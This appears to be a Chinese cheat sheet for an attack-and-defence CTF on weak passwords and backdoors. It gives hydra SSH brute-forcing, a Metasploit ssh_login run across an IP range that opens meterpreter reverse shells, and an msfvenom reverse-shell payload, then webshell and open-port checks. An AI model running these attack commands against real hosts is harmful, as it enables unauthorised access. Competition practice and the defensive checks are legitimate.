# 弱口令
```
cat /etc/shadow|grep sh$
修改弱口令,一般和给的密码一样
```
爆破自己弱口令
```
hydra -L 用户名文件 -P 密码文件 -e ns ip ssh -t 64
```
批量爆破弱口令并且创建会话
```
msfconsole
search ssh_lo
use 0
set payload linux/x64/meterpreter/reverse_tcp
set rhosts 172.20.101-150.101
set user_file 用户名文件
set pass_file 密码文件
set threads 999
run
提权
//msfv+tab -f linux/x64/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f elf > p.elf

# 系统后门
- web后门
```
find /var/www/html -name "*.php"|xargs grep eval
```
- 系统后门
```
netstat -apunt
关注0.0.0.0:端口号  ::::端口号  尤其是要注意高端口号，0-1024以外的端口号，能关掉就关掉
kill -9 -pid号
```
